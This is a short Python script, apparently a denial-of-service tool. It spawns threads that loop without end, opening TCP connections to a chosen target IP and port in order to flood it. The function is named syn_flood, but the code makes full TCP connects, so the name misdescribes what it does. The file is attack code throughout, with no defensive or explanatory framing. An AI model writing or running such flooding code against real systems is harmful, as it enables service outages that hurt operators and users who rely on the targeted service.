import socket
import threading

def syn_flood(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
        except:
            pass
        finally:
            s.close()

def start_attack(target_ip, target_port, thread_count=10):
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=syn_flood, args=(target_ip, target_port))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
